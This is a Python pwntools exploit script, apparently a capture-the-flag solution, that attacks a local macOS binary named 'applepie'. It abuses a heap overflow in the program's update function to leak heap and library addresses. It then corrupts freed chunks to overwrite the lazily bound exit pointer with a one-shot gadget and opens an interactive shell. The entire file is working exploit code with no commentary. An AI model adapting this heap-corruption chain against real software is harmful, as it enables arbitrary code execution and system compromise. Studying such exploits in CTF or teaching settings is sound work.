from pwn import *

r = process('./applepie')

sl = lambda x:r.sendline(str(x))
s = lambda x:r.send(str(x))
c = lambda:r.recvuntil(':')

def add(style,shape,size,name):
	sl(1)
	c()
	sl(style)
	c()
	sl(shape)
	c()
	sl(size)
	c()
	sl(name)
	return r.recvuntil('Choice:')

def show(idx):
	sl(2)
	c()
	sl(idx)
	return r.recvuntil('Choice:')

def update(idx,style,shape,size,name):
	sl(3)
	c()
	sl(idx)
	c()
	sl(style)
	c()
	sl(shape)
	c()
	sl(size)
	c()
	s(name)
	return r.recvuntil('Choice:')

def delete(idx):
	sl(4)
	c()
	sl(idx)
	return r.recvuntil('Choice:')

add(1,1,16,'1'*16)
add(1,1,16,'2'*16)
add(1,1,16,'3'*16)
update(0,1,1,16+0x18,'1'*16+p64(0x7f8)+p64(1)+p64(13371337))

leak = show(1)
leak = u64(leak.split(':')[1].split('\n')[0].strip()+'\x00\x00')
print 'leak',hex(leak)

libsystem_malloc = leak-82012
libsystem_c = libsystem_malloc-1437696
print 'libsystem_malloc',hex(libsystem_malloc)
print 'libsystem_c',hex(libsystem_c)
update(0, 1, 1, 0x10 + 0x18, "\x01" * 0x10 + p64(0x1fffffffffffffef) + p64(1) + p64(13371338))
leak2 = show(1)
leak2 = u64(leak2.split(':')[1].split('\n')[0].strip()+'\x00\x00')
print 'leak2',hex(leak2)
_DATA = leak2 - 0x4110
print '_DATA', hex(_DATA)
exit_lazy = _DATA + 0xb0
print 'exit_lazy',hex(exit_lazy)
oneshot = libsystem_c+0x000000000002573B
add(1,1,0x40,'A'*0x3f)	# 3
add(1,1,0x40,'B'*0x3f)
add(1,1,0x40,'C'*0x3f)
add(1,1,0x40,'D'*0x3f)
add(1,1,0x40,'E'*0x3f)
add(1,1,0x40,'F'*0x3f)	# 8


delete(3)
delete(5)
delete(7)
add(1, 1, 0x40, "\xda" * 0x3f) # 7
update(4,1,1,0x40+0x18,'1'*0x40+p64(oneshot)+p64(exit_lazy>>4)+p64(13371337))
sl(1)
sl(1)
sl(1)
sl(20000)

r.interactive()
